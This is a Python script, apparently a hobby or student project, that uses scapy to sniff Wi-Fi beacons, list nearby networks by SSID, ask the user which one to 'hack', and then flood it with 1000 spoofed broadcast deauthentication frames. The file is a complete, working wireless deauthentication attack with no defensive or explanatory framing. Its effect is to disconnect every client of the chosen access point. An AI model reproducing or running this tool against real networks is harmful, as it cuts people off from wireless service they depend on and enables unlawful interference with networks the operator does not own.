from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11Deauth, Dot11, Dot11Beacon
import sys

aps_dict = {}
timeOut = 10000


def printPretty():
    print("******************************************************")
    for ssid,mac_beacons in aps_dict.items():
        print("> SSID: "+ssid +" -> "+mac_beacons[0] +" beacons: "+ str(mac_beacons[1]))
    print("******************************************************")

def getSSID():
    ssid = ""
    while not(ssid in aps_dict):
        ssid = input("Select SSID to hack \t")
    return ssid

def disconnect_all(gateway_mac, interface):
    target_mac = "ff:ff:ff:ff:ff:ff"
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    # stack them up
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7) #radioTap- header in IEEE 802.11,
    # send the packet
    sendp(packet, inter=0.1, count=1000, iface=interface, verbose=1)

def main():
    print("Sniffing please wait...")
    interfaceName = sys.argv[1]
    sniff(prn=scanWifi, iface=interfaceName, count=timeOut)#iface - interface to sniff , prn - function
    #print(aps_dict)
    print("AP list: ")
    printPretty()
    ssid = getSSID()
    print("Start deauthentication attack on "+ssid)
    disconnect_all(aps_dict[ssid][0],interfaceName)


def scanWifi(pkt):
    if pkt.haslayer(Dot11Beacon):# check if the pkt is dot11
        if pkt.type == 0 and pkt.subtype == 8:# check if ( type 0-Management , 0 - Beacon)
            #print('SSID: %s MAC: %s'%(pkt.info,pkt.addr3))
            if not (pkt.info.decode("utf-8") in aps_dict):#decode("utf-8") - cast to String
                #print('SSID: %s MAC: %s'%(pkt.info,pkt.addr3))
                aps_dict[pkt.info.decode("utf-8")] = (pkt.addr3,1)
            else:
                numOfBeacons = aps_dict[pkt.info.decode("utf-8")][1]
                numOfBeacons+=1
                aps_dict[pkt.info.decode("utf-8")] = (pkt.addr3, numOfBeacons)
        else: pass
    else: pass



if __name__ == '__main__':
    main()